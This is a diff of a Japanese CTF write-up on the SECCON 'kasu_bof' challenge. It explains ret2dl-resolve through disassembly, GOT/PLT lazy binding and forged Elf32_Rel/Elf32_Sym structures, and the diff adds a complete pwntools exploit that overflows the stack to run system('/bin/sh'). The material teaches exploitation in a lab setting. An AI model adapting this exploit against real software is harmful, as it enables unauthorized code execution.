@@ -66,12 +66,12 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
 
 ** 1. return to dl resolve (ret2dl resolve)
    return to dl resolveは、ライブラリ関数のアドレスを動的に解決する際に呼び出される関数である ~_dl_runtime_resolve~ を利用し、任意のライブラリ関数を呼び出す攻撃手法である。
-
+   
    この攻撃の流れは以下のようになる。
 
-   1. 任意の関数(ここでは ~shell~ )を呼ぶため、 ~_dl_runtime_resolve~ に読み込ませる偽の ~Elf32_Rel~ 構造体と ~Elf32_Sym~ 構造体のオブジェクト、および NULL終端文字列 ~"system"~ と ~"/bin/sh"~ を書き込み可能な領域に用意
-   2. ~_dl_runtime_resolve~ が ~Elf32_Rel~ 構造体を特定するために引数に取る ~reloc_arg~ を、1.で用意した ~Elf32_Rel~ 構造体のオブジェクトを指すように指定
-   3. ~.plt~ の先頭にジャンプし、1.で用意した構造体のオブジェクトを元に ~system~ のアドレスを解決し、 ~system("/bin/sh")~ を実行
+   1. 任意の関数(ここでは ~system("/bin/sh")~ )を呼ぶため、 ~_dl_runtime_resolve~ に読み込ませる偽の ~Elf32_Rel~ 構造体と ~Elf32_Sym~ 構造体のオブジェクト、および NULL終端文字列 ~"system"~ と ~"/bin/sh"~ を書き込み可能な領域に用意
+   2. ~_dl_runtime_resolve~ は、引数の ~reloc_arg~ を元に ~Elf32_Rel~ 構造体を特定するため、 ~reloc_arg~ を1.で用意した ~Elf32_Rel~ 構造体のオブジェクトを指すように指定
+   3. ~.plt~ の先頭にジャンプすると、 ~_dl_runtime_resolve~  が呼ばれ、1.で用意した構造体のオブジェクトを元に ~system~ のアドレスが解決され、 ~system("/bin/sh")~ が実行
 
    そこで、以下では、 ~.plt~ セクションからのアドレス解決の流れを説明し、どのようにして偽の構造体を作成すればよいかについて説明する。
 
@@ -93,56 +93,32 @@ mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ checksec chall
  80491ae:       5d                      pop    ebp
  80491af:       c3                      ret    
     #+end_src
-    ディスアセンブルした ~main~ を見てみると、 ~0x8049199~ のアドレスにおいて、 ~gets@plt~ である ~0x8049040~ にジャンプしている。 ~gets@plt~ は、 ~.plt~ セクションに存在するため、 ~.plt~ セクションもディスアセンブルしてみる。
+    ディスアセンブルした ~main~ を見てみると、 ~0x8049199~ のアドレスにおいて、 ~gets@plt~ である ~0x8049040~ にジャンプしている。
+    ~gets@plt~ は、 ~.plt~ セクションに存在するため、 ~.plt~ セクションもディスアセンブルしてみる。
     
     #+begin_src
-08049030 <.plt>:
- 8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
- 8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
- 804903c:       00 00                   add    BYTE PTR [eax],al
-        ...
-
 08049040 <gets@plt>:
  8049040:       ff 25 0c c0 04 08       jmp    DWORD PTR ds:0x804c00c
- 8049046:       68 00 00 00 00          push   0x0
- 804904b:       e9 e0 ff ff ff          jmp    8049030 <.plt>
-
-08049050 <__libc_start_main@plt>:
- 8049050:       ff 25 10 c0 04 08       jmp    DWORD PTR ds:0x804c010
- 8049056:       68 08 00 00 00          push   0x8
- 804905b:       e9 d0 ff ff ff          jmp    8049030 <.plt>
+ 8049046:       ...
     #+end_src
-    先程呼ばれた ~gets@plt~ を確認してみると、 まず ~jmp    DWORD PTR ds:0x804c00c~ で ~0x804c00c~ 番地に格納されたアドレスへジャンプしている。この ~0x804c00c~ のアドレスは、GOTと呼ばれる領域にあり、最終的に解決された ~gets~ のアドレスが格納される。
-
+    先程呼ばれた ~gets@plt~ を確認してみると、 まず ~jmp    DWORD PTR ds:0x804c00c~ で ~0x804c00c~ 番地に格納されたアドレスへジャンプしている。
+    この ~0x804c00c~ のアドレスは、GOTと呼ばれる領域にあり、最終的に解決された ~gets~ のアドレスが格納される。
     
-    ここで、checksecの結果から、配布された実行ファイルは *Partial RELRO* であることがわかっている。
-    *Partial RELRO* は、共有ライブラリが遅延バインドされることを表しており、1回目のライブラリ関数の呼び出しの際に、共有ライブラリのアドレスを解決し、解決したアドレスをGOTへ格納する。
-    このため、2回目以降のライブラリ関数の呼び出しは、GOTに格納された解決済のアドレスへジャンプすることで可能となる。
-
-    
-    # しかし、問題を見てみると、 ~gets@plt~ は1回目の呼び出しであるため、まだGOTには解決されたアドレスは格納されていない。
     そこで、1回目の ~gets@plt~ の呼び出し時に、GOTには何が格納されているのか確認してみる。
-
-    以下は、 ~gets@plt~ を呼び出す前のGOTの状態。
     #+begin_src
-gef➤  got
-
-GOT protection: Partial RelRO | GOT functions: 2
- 
-[0x804c00c] gets@GLIBC_2.0  →  0x8049046
-[0x804c010] __libc_start_main@GLIBC_2.0  →  0xf7de1de0
+gef➤  hexdump  dword 0x804c00c
+0x0804c00c│+0x0000   <gets@got.plt+0000> 0x08049046   
+0x0804c010│+0x0004   ...
     #+end_src
-    GOTを確認すると、次の命令のアドレス ( ~0x8049046~ )がGOTに格納されていることがわかる。
-    このため、引き続き ~0x8049046~ からの命令読んでいく。
-
     
-    次の命令 ~push   0x0~ では、スタックに ~0x0~ を積み、その後 ~jmp    8049030 <.plt>~ で ~.plt~ セクションの先頭にジャンプしている。
+    すると、 ~0x804c00c~ には、次の命令のアドレス ( ~0x8049046~ )がGOTに格納されていることがわかる。
+    このため、引き続き ~0x8049046~ からの命令読んでいく。
     #+begin_src
 08049030 <.plt>:
  8049030:       ff 35 04 c0 04 08       push   DWORD PTR ds:0x804c004
  8049036:       ff 25 08 c0 04 08       jmp    DWORD PTR ds:0x804c008
- 804903c:       00 00                   add    BYTE PTR [eax],al
-    #+end_src
+    #+end_src        
+    次の命令 ~push   0x0~ では、スタックに ~0x0~ を積み、その後 ~jmp    8049030 <.plt>~ で ~.plt~ セクションの先頭にジャンプしている。
     
     ~.plt~ の先頭の命令は、 ~push   DWORD PTR ds:0x804c004~ となっており、 ~0x804c004~ に格納されている値をスタックに積む。
     そして、次の命令 ~jmp    DWORD PTR ds:0x804c008~ で ~0x804c008~ に格納されているアドレスへジャンプする。
@@ -158,7 +134,6 @@ gef➤  hexdump dword 0x804c004
     まとめると、 ~.plt~ の先頭の命令では、スタックに ~0xf7ffd990~ を積み、 ~0xf7fe7ac0~ 番地へジャンプしている。
     そして、 ~0xf7fe7ac0~ へジャンプ後、 ~gets~ のアドレスが解決され、 ~gets~ が実行される。
     また、二回目以降の呼び出しのために、解決されたアドレスは、GOTへ格納される。
-
 
     以上が ~main~ から ~gets~ が実行されるまでの流れであり、 ~return to dl resolve~ をするために必要となる ~.plt~ セクション以降の流れについて以降では詳しく見ていく。
     
@@ -258,6 +233,20 @@ type = struct {
   ~Elf32_Dyn~ 構造体は、 それぞれの構造体がどのセクションの何の情報を持つのかを表す識別子である ~d_tag~ と、 ~d_tag~ に対応した値を ~union~ 型として持つ。
 
   ここで、 ~.dynamic~ セクションを参照するため、このセクションそのもののアドレスを得るためには、 ~link_map~ 構造体の ~l_info~ フィールドを参照する必要がある。
+  各セクションの情報が格納されている ~l_info~ において、インデックスは、対応した ~d_tag~ により参照される。
+    - d_tagに代入されうる値の一覧
+      - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862
+          #+begin_src c
+	  /* Legal values for d_tag (dynamic entry type).  */
+	  ...
+	  #define DT_STRTAB	5		/* Address of string table */
+	  #define DT_SYMTAB	6		/* Address of symbol table */
+	  ...
+	  #define DT_REL	17		/* Address of Rel relocs */
+	  ...
+	  #define DT_JMPREL	23		/* Address of PLT relocs */
+	  ...
+	  #+end_src
 
   そこで、次に ~link_map~ 構造体の構造と、 ~.dynamic~ セクションそのもののアドレスを解決する流れを見ていく。 
  	
@@ -337,20 +326,21 @@ gef➤  ptype /o struct link_map
      *return to dl resolve* において、 ~link_map~ 構造体で ~offset~ が32の位置に保持されている ~l_info~ フィールドを利用する。
       ~l_info~ は、各セクションへのアドレスを保持している。
 
-     各セクションの情報が格納されている ~l_info~ において、インデックスは、対応した ~d_tag~ により参照される。
-      - d_tagに代入されうる値の一覧
-        - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862
-          #+begin_src c
-	  /* Legal values for d_tag (dynamic entry type).  */
-	  ...
-	  #define DT_STRTAB	5		/* Address of string table */
-	  #define DT_SYMTAB	6		/* Address of symbol table */
-	  ...
-	  #define DT_REL	17		/* Address of Rel relocs */
-	  ...
-	  #define DT_JMPREL	23		/* Address of PLT relocs */
-	  ...
-	  #+end_src
+     # 各セクションの情報が格納されている ~l_info~ において、インデックスは、対応した ~d_tag~ により参照される。
+     #  - d_tagに代入されうる値の一覧
+     #    - https://elixir.bootlin.com/glibc/glibc-2.36/source/elf/elf.h#L862
+     #      #+begin_src c
+     # 	  /* Legal values for d_tag (dynamic entry type).  */
+     # 	  ...
+     # 	  #define DT_STRTAB	5		/* Address of string table */
+     # 	  #define DT_SYMTAB	6		/* Address of symbol table */
+     # 	  ...
+     # 	  #define DT_REL	17		/* Address of Rel relocs */
+     # 	  ...
+     # 	  #define DT_JMPREL	23		/* Address of PLT relocs */
+     # 	  ...
+     # 	  #+end_src
+     # 	  
      例えば、 ~.dynamic~ セクションのアドレスを参照したい場合、 ~d_tag~ が ~DT_JMPREL~ の ~Elf32_Dyn~ 構造体を参照すればよいため、 ~l_info[23]~ とすることで参照することができる。
    
    ここで、実際にgdbを用いて ~link_map~ 構造体から ~.dynamic~ セクションのアドレスを解決してみる。
@@ -418,7 +408,7 @@ $11 = {
     ここで、 ~r_offset~ はライブラリ関数のアドレスを解決後に、そのアドレスを格納するGOT領域のエントリとなる。
     このため、 ~gets~ のアドレスが解決されると、 ~0x804c00c~ にそのアドレスが格納されることになる。
 	 
-    ~r_info~ は、シンボルを解決するために使用される。
+    ~r_info~ は、その下位8bitと残りの上位24bitそれぞれに、次のような値を保持する。
     ~r_info~ を 8 byte 右シフトすることにより、 ~.dynsym~ のインデックスを取得することができる。
       #+begin_src c
 	/* How to extract and insert information held in the r_info field.  */
@@ -632,10 +622,110 @@ reloc_arg---+   reloc_arg + .rel.plt         |                                  
      #+end_src
 
 *** Solver    
-    https://github.com/Team-Enu/writeup/tree/main/seccon-ctf-2022/kasu_bof
+    # https://github.com/Team-Enu/writeup/tree/main/seccon-ctf-2022/kasu_bof
+    #+begin_src python
+from pwn import *
+
+filename = './chall'
+chall = ELF(filename)
+
+# docker-compose up
+conn = remote('localhost', 9001)
+# conn = process(filename)
+
+plt = chall.get_section_by_name('.plt').header.sh_addr
+bss = chall.get_section_by_name('.bss').header.sh_addr
+rel = chall.get_section_by_name('.rel.plt').header.sh_addr
+dynsym = chall.get_section_by_name('.dynsym').header.sh_addr
+dynstr = chall.get_section_by_name('.dynstr').header.sh_addr
+gets_got = chall.got['gets']
+gets_plt = chall.plt['gets']
+
+# 0x08049022: pop ebx; ret;
+pop_ret = 0x08049022
+
+Elf32_Rel_addr = bss
+
+Elf32_Sym_addr = Elf32_Rel_addr + 0x10
+
+system_symbol_addr = Elf32_Sym_addr + 0x14
+
+sh_symbol_addr = system_symbol_addr + 0x1c
+
+# calc index of Elf32_Rel from .rel.plt
+reloc_arg = Elf32_Rel_addr - rel
+
+# padding
+buf = b'A'*0x84                 # fill stack
+buf += p32(0xdeadbeaf)         # saved_ebp
+
+# gets(Elf32_Rel_addr)
+buf += p32(gets_plt)           # main return addr
+buf += p32(pop_ret)            # gets return addr
+buf += p32(Elf32_Rel_addr)     # gets arg
+
+# gets(Elf32_Sym_addr)
+buf += p32(gets_plt)           # pop ret return addr
+buf += p32(pop_ret)            # gets return addr
+buf += p32(Elf32_Sym_addr)     # gets arg
+
+# gets(system_symbol_addr)
+buf += p32(gets_plt)           # pop ret return addr
+buf += p32(pop_ret)            # gets return addr
+buf += p32(system_symbol_addr) # gets arg
+
+# gets(sh_symbol_addr)
+buf += p32(gets_plt)           # pop ret return addr
+buf += p32(pop_ret)            # gets return  addr
+buf += p32(sh_symbol_addr)     # gets arg
+
+# system('/bin/sh')
+buf += p32(plt)                # pop ret return addr
+buf += p32(reloc_arg)          # reloc arg
+buf += p32(0xdeadbeef)         # padding
+buf += p32(sh_symbol_addr)     # system arg
+
+conn.sendline(buf)
+
+# create Elf32_Rel
+r_offset = gets_got
+r_info   = ((Elf32_Sym_addr - dynsym)//0x10)<<8 | 7
+
+Elf32_Rel = p32(r_offset)
+Elf32_Rel += p32(r_info)
+    
+conn.sendline(Elf32_Rel)
+
+# create Elf32_Sym
+st_name = system_symbol_addr - dynstr
+st_value = 0x0
+st_size = 0x0
+st_info = 0x12
+st_other = 0x0
+st_shndx = 0x0
+
+Elf32_Sym = p32(st_name)
+Elf32_Sym += p32(st_value)
+Elf32_Sym += p32(st_size)
+Elf32_Sym += p8(st_info)
+Elf32_Sym += p8(st_other)
+Elf32_Sym += p16(st_shndx)
+
+conn.sendline(Elf32_Sym)
+
+# create system symbol
+conn.sendline(b'system')
+
+# create sh symbol
+conn.sendline(b'/bin/sh')
+
+conn.interactive()
+
+
+    #+end_src
 
 **** 実行結果
-     以上の流れを踏まえて、作成したSolverを実行する。
+     # 以上の流れを踏まえて、作成したSolverを実行する。
      #+begin_example
 mc4nf@mc4nf:~/ctf/seccon2021/pwn/kasu_bof$ python solve.py 
 [*] '/home/mc4nf/ctf/seccon2021/pwn/kasu_bof/chall'
